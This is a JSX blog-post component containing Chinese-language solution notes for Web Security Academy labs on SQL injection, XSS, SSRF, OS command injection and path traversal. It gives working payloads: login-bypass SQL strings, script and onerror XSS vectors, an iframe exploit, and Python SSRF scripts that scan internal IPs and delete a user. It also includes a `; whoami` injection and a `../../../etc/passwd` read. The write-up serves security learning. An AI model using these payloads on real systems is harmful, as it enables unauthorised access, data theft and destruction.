import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>SQL injection</X.H1>
            <X.H2>Ap: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</X.H2>
            <X.P>给了查询的SQL语句示例：</X.P>
            <X.CodeBlock language="sql" code="SELECT * FROM products WHERE category = 'Gifts' AND released = 1" />
            <X.P>构造`payload`为`Gifts' or 1=1 --`，输入URL`/filter?category=Gifts%27%20or%201=1%20--`。</X.P>
            <X.H2>Ap: SQL injection vulnerability allowing login bypass</X.H2>
            <X.P>直接用用户名`administrator' --`；或用户名`administrator`，密码`1' or 1=1 --`。</X.P>
            <X.H1>XSS: Cross-site scripting</X.H1>
            <X.H2>笔记</X.H2>
            <X.Uli>
                `document.write`和`innerHTML`：`innerHTML`写入的`script`标签不会被解析执行；`document.write`会直接将内容插入文档流，写入的`script`标签会被执行。对于`innerHTML`的情况可以考虑使用
                {'`<img src=0 onerror="alert(0)">`'}。
            </X.Uli>
            <X.H2>Ap: Reflected XSS into HTML context with nothing encoded</X.H2>
            <X.P>反射型XSS，搜索{'`<script>alert(0)</script>`'}。</X.P>
            <X.H2>Ap: Stored XSS into HTML context with nothing encoded</X.H2>
            <X.P>存储型XSS，评论{'`<script>alert(0)</script>`'}。</X.P>
            <X.H2>Ap: DOM XSS in document.write sink using source location.search</X.H2>
            <X.P>页面中有如下代码：</X.P>
            <X.CodeBlock
                language="js"
                code={`
                function trackSearch(query) {
                    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                }
                var query = (new URLSearchParams(window.location.search)).get('search');
                if(query) {
                    trackSearch(query);
                }
                `}
            />
            <X.P>构造`payload`为{'`"><script>alert(0)</script>`'}，输入搜索即可。</X.P>
            <X.H2>Ap: DOM XSS in innerHTML sink using source location.search</X.H2>
            <X.P>页面中有如下代码：</X.P>
            <X.CodeBlock
                language="js"
                code={`
                function doSearchQuery(query) {
                    document.getElementById('searchMessage').innerHTML = query;
                }
                var query = (new URLSearchParams(window.location.search)).get('search');
                if(query) {
                    doSearchQuery(query);
                }
                `}
            />
            <X.P>构造`payload`为{'`<img src=0 onerror="alert(0)">`'}，输入搜索即可。</X.P>
            <X.H2>Ap: DOM XSS in jQuery anchor href attribute sink using location.search source</X.H2>
            <X.P>`/feedback`页面中有如下代码：</X.P>
            <X.CodeBlock
                language="js"
                code={`
                $(function() {
                    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                });
                `}
            />
            <X.P>
                注入点是`a`标签的`href`，`payload`为`javascript:alert(0)`。输入URL`/feedback?returnPath=javascript:alert(0)`，然后点击这个`a`标签。
            </X.P>
            <X.H2>Ap: DOM XSS in jQuery selector sink using a hashchange event</X.H2>
            <X.P>注入点：</X.P>
            <X.CodeBlock
                language="js"
                code={`
                $(window).on('hashchange', function(){
                    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                    if (post) post.get(0).scrollIntoView();
                });
                `}
            />
            <X.P>
                此题目用到特定版本jQuery的漏洞，`$()`可以被利用向DOM中注入恶意元素。这道题目需要构造一个恶意网页发送给目标用户，所以需要在用户侧触发`hashchange`，因此使用`iframe`。
            </X.P>
            <X.P>
                官方题解直接在`onload`中改变`this.src`，尽管也可以触发`print()`函数，但是这样做会导致循环（`this.src`改变时，再次调用`onload`，然后再改变`this.src`）。所以这里加了判断。
            </X.P>
            <X.CodeBlock
                language="html"
                code={`
                <iframe
                    src="https://0a47005704554525834f7e66009e008f.web-security-academy.net/#"
                    onload="this.src.endsWith('#') && (this.src+='<img src=0 onerror=print()>')"
                >
                `}
            />
            <X.H1>SSRF: Server-side request forgery</X.H1>
            <X.H2>Ap: Basic SSRF against the local server</X.H2>
            <X.P>根据提示，发送请求：</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "https://0aaf00c7049bf8f4805d26ba00c90059.web-security-academy.net/product/stock"
                stockApi = "http://localhost/admin"
                resp = requests.post(url, data={"stockApi": stockApi})
                print(resp.text)
                `}
            />
            <X.P>
                在返回中看到{'`<a href="/admin/delete?username=carlos">Delete</a>`'}
                ，再次发送对`/admin/delete?username=carlos`的请求即可。
            </X.P>
            <X.H2>Ap: Basic SSRF against another back-end system</X.H2>
            <X.P>根据提示扫描端口：</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "https://0aee006003dd23eb8589365a00810071.web-security-academy.net/product/stock"
                for x in range(255):
                    stockApi = f"http://192.168.0.{x}:8080/admin"
                    resp = requests.post(url, data={"stockApi": stockApi})
                    print(x, resp.status_code)
                `}
            />
            <X.P>`192.168.0.13:8080/admin`返回`200`。删除用户同上。</X.P>
            <X.H2>Pr: Blind SSRF with out-of-band detection</X.H2>
            <X.P>根据提示，重放请求，把`Referer`改为Burp Collaborator生成的地址，发送即可。</X.P>
            <X.H2>Pr: SSRF with blacklist-based input filter</X.H2>
            <X.P>官方题解用的是双重URL编码，这里发现大写也能绕过。</X.P>
            <X.CodeBlock
                language="python"
                highlightLines="4"
                code={`
                import requests

                url = "https://0aab002a034b510483b51fab001200c3.web-security-academy.net/product/stock"
                stockApi = f"http://Localhost/Admin/delete?username=carlos"
                resp = requests.post(url, data={"stockApi": stockApi})
                print(resp.text)
                `}
            />
            <X.H1>OS command injection</X.H1>
            <X.H2>Ap: OS command injection, simple case</X.H2>
            <X.P>提示了网站会用参数直接执行shell脚本，所以：</X.P>
            <X.CodeBlock
                language="python"
                code={`resp = requests.post(url, data={"productId": 1, "storeId": "; whoami"})`}
            />
            <X.H1>Path traversal</X.H1>
            <X.H2>Ap: File path traversal, simple case</X.H2>
            <X.P>随便检查一个图片，地址为`/image?filename=23.jpg`，改为`/txt?filename=../../../etc/passwd`即可。</X.P>
        </>
    );
}
